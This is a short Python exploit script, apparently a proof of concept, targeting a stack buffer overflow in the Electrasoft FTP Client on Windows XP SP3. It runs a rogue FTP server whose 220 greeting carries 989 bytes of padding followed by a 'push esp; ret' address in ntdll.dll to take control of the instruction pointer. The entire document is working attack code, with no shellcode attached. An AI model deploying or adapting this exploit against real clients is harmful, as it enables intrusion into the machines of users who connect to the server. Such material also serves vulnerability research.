#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt 
#
# Target: Windows XP SP3

from pwn import *

buf = "A" * 989			# our eip begins @ 989 bytes 
buf += p32(0x7c919db0)		# push esp; ret in ntdll.dll
buf += "A" * (2000 - len(buf))	# pad to 2000 bytes

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

